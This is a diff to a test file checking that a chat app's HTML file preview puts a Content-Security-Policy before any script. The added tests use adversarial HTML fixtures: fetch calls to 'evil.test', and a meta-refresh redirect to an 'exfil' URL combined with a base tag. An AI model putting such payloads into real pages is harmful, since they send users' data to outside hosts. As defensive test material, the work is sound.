@@ -45,11 +45,30 @@ describe("files in the chat", () => {
     expect(csvRows("a\tb\tc", "\t", 10, 2)).toEqual([["a", "b"]]);
   });
 
-  it("keeps a page file offline: its policy goes into its own head", () => {
+  it("keeps a page file offline: its policy goes into its own head before any script", () => {
     const page = filePageDocument("<!doctype html><html><head><title>骑车</title></head><body></body></html>");
     expect(page).toMatch(/^<!doctype html><html><head><meta http-equiv="Content-Security-Policy"/);
     expect(page).toContain("connect-src 'none'");
-    expect(filePageDocument("<p>片段</p>")).toMatch(/^<meta http-equiv="Content-Security-Policy"/);
+    expect(filePageDocument("<p>片段</p>")).toMatch(/^<!doctype html><html><head><meta http-equiv="Content-Security-Policy"/);
+
+    // Adversarial HTML attempting to trick regex injection via JS strings, comments, or pre-head scripts.
+    const inJsString = filePageDocument('<script>fetch("https://evil.test"); var s = "<head>";</script>');
+    expect(inJsString.indexOf('http-equiv="Content-Security-Policy"')).toBeGreaterThan(0);
+    expect(inJsString.indexOf('http-equiv="Content-Security-Policy"')).toBeLessThan(inJsString.indexOf("<script>"));
+
+    const preHeadScript = filePageDocument('<!doctype html><script>fetch("https://evil.test")</script><head><title>x</title></head>');
+    expect(preHeadScript.indexOf('http-equiv="Content-Security-Policy"')).toBeLessThan(preHeadScript.indexOf("<script>"));
+
+    const commentedHead = filePageDocument('<html><body><!-- <head> --><script>fetch("https://evil.test")</script></body></html>');
+    expect(commentedHead).toMatch(/^<!doctype html><html><head><meta http-equiv="Content-Security-Policy"/);
+    expect(commentedHead.indexOf('http-equiv="Content-Security-Policy"')).toBeLessThan(commentedHead.indexOf("<!--"));
+
+    const metaRefreshAndBase = filePageDocument(
+      '<html><head><base href="https://evil.test/"><meta http-equiv="refresh" content="0;url=https://evil.test/?exfil=1"></head><body>ok</body></html>',
+    );
+    expect(metaRefreshAndBase).not.toMatch(/http-equiv=["']?refresh/i);
+    expect(metaRefreshAndBase).not.toMatch(/<base\b/i);
+    expect(metaRefreshAndBase).toContain('http-equiv="Content-Security-Policy"');
   });
 
   it("shows a Markdown file's first page and its size, and opens it on a tap", async () => {
